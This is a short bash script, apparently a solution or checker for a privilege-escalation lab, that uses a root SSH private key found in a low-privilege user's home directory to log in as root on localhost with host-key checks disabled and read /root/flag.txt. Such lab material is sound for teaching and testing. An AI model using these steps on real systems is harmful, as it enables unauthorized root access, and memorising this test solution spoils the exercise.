#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cp /home/lowpriv/root_id_rsa /tmp/root_id_rsa
chmod 600 /tmp/root_id_rsa
PORT=$(awk "/^Port /{print \$2; exit}" /etc/ssh/sshd_config)
PORT=${PORT:-22}
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PasswordAuthentication=no \
  -i /tmp/root_id_rsa -p "$PORT" root@127.0.0.1 "cat /root/flag.txt"
')"
assert_root_output "${out}"
